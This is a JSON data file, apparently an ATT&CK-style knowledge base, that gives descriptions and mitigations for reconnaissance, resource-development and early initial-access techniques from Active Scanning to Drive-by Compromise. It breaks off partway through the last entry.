[
  {
    "id": "T1595",
    "name": "Active Scanning",
    "tactics": [{ "id": "TA0043", "name": "Reconnaissance" }],
    "subs": [
      { "id": "T1595.001", "name": "Scanning IP Blocks" },
      { "id": "T1595.002", "name": "Vulnerability Scanning" },
      { "id": "T1595.003", "name": "Wordlist Scanning" }
    ],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Exploit Public-Facing Application)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": [
          [
            {
              "type": "text",
              "content": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1592",
    "name": "Gather Victim Host Information",
    "tactics": [{ "id": "TA0043", "name": "Reconnaissance" }],
    "subs": [
      { "id": "T1592.001", "name": "Hardware" },
      { "id": "T1592.002", "name": "Software" },
      { "id": "T1592.003", "name": "Firmware" },
      { "id": "T1592.004", "name": "Client Configurations" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.)."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or External Remote Services)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": [
          [
            {
              "type": "text",
              "content": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1589",
    "name": "Gather Victim Identity Information",
    "tactics": [{ "id": "TA0043", "name": "Reconnaissance" }],
    "subs": [
      { "id": "T1589.001", "name": "Credentials" },
      { "id": "T1589.002", "name": "Email Addresses" },
      { "id": "T1589.003", "name": "Employee Names" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, etc.) as well as sensitive details such as credentials."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about users could also be enumerated via other active means (i.e. Active Scanning) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system. Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites)."
        }
      ],
      [
        {
          "type": "text",
          "content": "Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: Phishing or Valid Accounts)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": [
          [
            {
              "type": "text",
              "content": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1590",
    "name": "Gather Victim Network Information",
    "tactics": [{ "id": "TA0043", "name": "Reconnaissance" }],
    "subs": [
      { "id": "T1590.001", "name": "Domain Properties" },
      { "id": "T1590.002", "name": "DNS" },
      { "id": "T1590.003", "name": "Network Trust Dependencies" },
      { "id": "T1590.004", "name": "Network Topology" },
      { "id": "T1590.005", "name": "IP Addresses" },
      { "id": "T1590.006", "name": "Network Security Appliances" }
    ],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Trusted Relationship)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": [
          [
            {
              "type": "text",
              "content": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1591",
    "name": "Gather Victim Org Information",
    "tactics": [{ "id": "TA0043", "name": "Reconnaissance" }],
    "subs": [
      { "id": "T1591.001", "name": "Determine Physical Locations" },
      { "id": "T1591.002", "name": "Business Relationships" },
      { "id": "T1591.003", "name": "Identify Business Tempo" },
      { "id": "T1591.004", "name": "Identify Roles" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Phishing or Trusted Relationship)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": [
          [
            {
              "type": "text",
              "content": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1598",
    "name": "Phishing for Information",
    "tactics": [{ "id": "TA0043", "name": "Reconnaissance" }],
    "subs": [
      { "id": "T1598.001", "name": "Spearphishing Service" },
      { "id": "T1598.002", "name": "Spearphishing Attachment" },
      { "id": "T1598.003", "name": "Spearphishing Link" },
      { "id": "T1598.004", "name": "Spearphishing Voice" }
    ],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from Phishing in that the objective is gathering data from the victim rather than executing malicious code."
        }
      ],
      [
        {
          "type": "text",
          "content": "All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means. Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information."
        }
      ],
      [
        {
          "type": "text",
          "content": "Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by forging or spoofing the identity of the sender which can be used to fool both the human recipient as well as automated security tools. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Phishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., Email Hiding Rules)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1054",
        "name": "Software Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Users can be trained to identify social engineering techniques and spearphishing attempts."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1597",
    "name": "Search Closed Sources",
    "tactics": [{ "id": "TA0043", "name": "Reconnaissance" }],
    "subs": [
      { "id": "T1597.001", "name": "Threat Intel Vendors" },
      { "id": "T1597.002", "name": "Purchase Technical Data" }
    ],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": [
          [
            {
              "type": "text",
              "content": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1596",
    "name": "Search Open Technical Databases",
    "tactics": [{ "id": "TA0043", "name": "Reconnaissance" }],
    "subs": [
      { "id": "T1596.001", "name": "DNS/Passive DNS" },
      { "id": "T1596.002", "name": "WHOIS" },
      { "id": "T1596.003", "name": "Digital Certificates" },
      { "id": "T1596.004", "name": "CDNs" },
      { "id": "T1596.005", "name": "Scan Databases" }
    ],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": [
          [
            {
              "type": "text",
              "content": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1593",
    "name": "Search Open Websites/Domains",
    "tactics": [{ "id": "TA0043", "name": "Reconnaissance" }],
    "subs": [
      { "id": "T1593.001", "name": "Social Media" },
      { "id": "T1593.002", "name": "Search Engines" },
      { "id": "T1593.003", "name": "Code Repositories" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: External Remote Services or Phishing)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1013",
        "name": "Application Developer Guidance",
        "description": [
          [
            {
              "type": "text",
              "content": "Application developers uploading to public code repositories should be careful to avoid publishing sensitive information such as credentials and API keys."
            }
          ]
        ]
      },
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Scan public code repositories for exposed credentials or other sensitive information before making commits. Ensure that any leaked credentials are removed from the commit history, not just the current latest version of the code."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1594",
    "name": "Search Victim-Owned Websites",
    "tactics": [{ "id": "TA0043", "name": "Reconnaissance" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: Email Addresses). These sites may also have details highlighting business operations and relationships."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Trusted Relationship or Phishing)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": [
          [
            {
              "type": "text",
              "content": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1650",
    "name": "Acquire Access",
    "tactics": [{ "id": "TA0042", "name": "Resource Development" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems. In some cases, adversary groups may form partnerships to share compromised systems with each other."
        }
      ],
      [
        {
          "type": "text",
          "content": "Footholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., Web Shell) or established access via External Remote Services. In some cases, access brokers will implant compromised systems with a \"load\" that can be used to install additional malware for paying customers."
        }
      ],
      [
        {
          "type": "text",
          "content": "By leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector."
        }
      ],
      [
        {
          "type": "text",
          "content": "In some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a Trusted Relationship, Multi-Factor Authentication Interception, or even Supply Chain Compromise."
        }
      ],
      [
        {
          "type": "text",
          "content": "Note: while this technique is distinct from other behaviors such as Purchase Technical Data and Credentials, they may often be used in conjunction (especially where the acquired foothold requires Valid Accounts)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": [
          [
            {
              "type": "text",
              "content": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. "
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1583",
    "name": "Acquire Infrastructure",
    "tactics": [{ "id": "TA0042", "name": "Resource Development" }],
    "subs": [
      { "id": "T1583.001", "name": "Domains" },
      { "id": "T1583.002", "name": "DNS Server" },
      { "id": "T1583.003", "name": "Virtual Private Server" },
      { "id": "T1583.004", "name": "Server" },
      { "id": "T1583.005", "name": "Botnet" },
      { "id": "T1583.006", "name": "Web Services" },
      { "id": "T1583.007", "name": "Serverless" },
      { "id": "T1583.008", "name": "Malvertising" }
    ],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Additionally, botnets are available for rent or purchase."
        }
      ],
      [
        {
          "type": "text",
          "content": "Use of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support Proxy, including from residential proxy services. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": [
          [
            {
              "type": "text",
              "content": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1586",
    "name": "Compromise Accounts",
    "tactics": [{ "id": "TA0042", "name": "Resource Development" }],
    "subs": [
      { "id": "T1586.001", "name": "Social Media Accounts" },
      { "id": "T1586.002", "name": "Email Accounts" },
      { "id": "T1586.003", "name": "Cloud Accounts" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. Establish Accounts), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. "
        }
      ],
      [
        {
          "type": "text",
          "content": "A variety of methods exist for compromising accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials. Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation."
        }
      ],
      [
        {
          "type": "text",
          "content": "Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may directly leverage compromised email accounts for Phishing for Information or Phishing."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": [
          [
            {
              "type": "text",
              "content": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1584",
    "name": "Compromise Infrastructure",
    "tactics": [{ "id": "TA0042", "name": "Resource Development" }],
    "subs": [
      { "id": "T1584.001", "name": "Domains" },
      { "id": "T1584.002", "name": "DNS Server" },
      { "id": "T1584.003", "name": "Virtual Private Server" },
      { "id": "T1584.004", "name": "Server" },
      { "id": "T1584.005", "name": "Botnet" },
      { "id": "T1584.006", "name": "Web Services" },
      { "id": "T1584.007", "name": "Serverless" }
    ],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle. Additionally, adversaries may compromise numerous machines to form a botnet they can leverage."
        }
      ],
      [
        {
          "type": "text",
          "content": "Use of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with Digital Certificates) to further blend in and support staged information gathering and/or Phishing campaigns. Additionally, adversaries may also compromise infrastructure to support Proxy and/or proxyware services."
        }
      ],
      [
        {
          "type": "text",
          "content": "By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": [
          [
            {
              "type": "text",
              "content": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1587",
    "name": "Develop Capabilities",
    "tactics": [{ "id": "TA0042", "name": "Resource Development" }],
    "subs": [
      { "id": "T1587.001", "name": "Malware" },
      { "id": "T1587.002", "name": "Code Signing Certificates" },
      { "id": "T1587.003", "name": "Digital Certificates" },
      { "id": "T1587.004", "name": "Exploits" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle."
        }
      ],
      [
        {
          "type": "text",
          "content": "As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": [
          [
            {
              "type": "text",
              "content": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1585",
    "name": "Establish Accounts",
    "tactics": [{ "id": "TA0042", "name": "Resource Development" }],
    "subs": [
      { "id": "T1585.001", "name": "Social Media Accounts" },
      { "id": "T1585.002", "name": "Email Accounts" },
      { "id": "T1585.003", "name": "Cloud Accounts" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity."
        }
      ],
      [
        {
          "type": "text",
          "content": "For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos."
        }
      ],
      [
        {
          "type": "text",
          "content": "Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for Phishing for Information or Phishing."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": [
          [
            {
              "type": "text",
              "content": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1588",
    "name": "Obtain Capabilities",
    "tactics": [{ "id": "TA0042", "name": "Resource Development" }],
    "subs": [
      { "id": "T1588.001", "name": "Malware" },
      { "id": "T1588.002", "name": "Tool" },
      { "id": "T1588.003", "name": "Code Signing Certificates" },
      { "id": "T1588.004", "name": "Digital Certificates" },
      { "id": "T1588.005", "name": "Exploits" },
      { "id": "T1588.006", "name": "Vulnerabilities" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle."
        }
      ],
      [
        {
          "type": "text",
          "content": "In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals."
        }
      ],
      [
        {
          "type": "text",
          "content": "In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": [
          [
            {
              "type": "text",
              "content": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1608",
    "name": "Stage Capabilities",
    "tactics": [{ "id": "TA0042", "name": "Resource Development" }],
    "subs": [
      { "id": "T1608.001", "name": "Upload Malware" },
      { "id": "T1608.002", "name": "Upload Tool" },
      { "id": "T1608.003", "name": "Install Digital Certificate" },
      { "id": "T1608.004", "name": "Drive-by Target" },
      { "id": "T1608.005", "name": "Link Target" },
      { "id": "T1608.006", "name": "SEO Poisoning" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed (Develop Capabilities) or obtained (Obtain Capabilities) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications."
        }
      ],
      [
        {
          "type": "text",
          "content": "Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):"
        }
      ],
      [
        {
          "type": "li",
          "content": "Staging web resources necessary to conduct Drive-by Compromise when a user browses to a site."
        },
        {
          "type": "li",
          "content": "Staging web resources for a link target to be used with spearphishing."
        },
        {
          "type": "li",
          "content": "Uploading malware or tools to a location accessible to a victim network to enable Ingress Tool Transfer."
        },
        {
          "type": "li",
          "content": "Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: Asymmetric Cryptography with Web Protocols)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": [
          [
            {
              "type": "text",
              "content": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1659",
    "name": "Content Injection",
    "tactics": [
      { "id": "TA0001", "name": "Initial Access" },
      { "id": "TA0011", "name": "Command and Control" }
    ],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., Drive-by Target followed by Drive-by Compromise), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., Ingress Tool Transfer) and other data to already compromised systems."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may inject content to victim systems in various ways, including:"
        }
      ],
      [
        {
          "type": "li",
          "content": "From the middle, where the adversary is in-between legitimate online client-server communications (Note: this is similar but distinct from Adversary-in-the-Middle, which describes AiTM activity solely within an enterprise environment)"
        },
        {
          "type": "li",
          "content": "From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server"
        }
      ],
      [
        {
          "type": "text",
          "content": "Content injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\""
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": [
          [
            {
              "type": "text",
              "content": "Where possible, ensure that online traffic is appropriately encrypted through services such as trusted VPNs."
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "Restrict Web-Based Content",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider blocking download/transfer and execution of potentially uncommon file types known to be used in adversary campaigns."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1189",
    "name": "Drive-by Compromise",
    "tactics": [{ "id": "TA0001", "name": "Initial Access" }],
    "subs": [],
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token."
        }
      ],
      [
        {
          "type": "text",
          "content": "Multiple ways of delivering exploit code to a browser exist (i.e., Drive-by Target), including:"
        }
      ],
      [
        {
          "type": "li",
          "content": "A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting"
        },
        {
          "type": "li",
          "content": "Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary"
        },
        {
          "type": "li",
          "content": "Malicious ads are paid for and served through legitimate ad providers (i.e., Malvertising)"
        },
        {
          "type": "li",
          "content": "Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content)."
        }
      ],
      [
        {
          "type": "text",
          "content": "Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring."
        }
      ],
      [{ "type": "text", "content": "Typical drive-by compromise process:" }],
      [
        {
          "type": "text",
          "content": "Unlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1048",
        "name": "Application Isolation and Sandboxing",
        "description": [
          [
            {
              "type": "text",
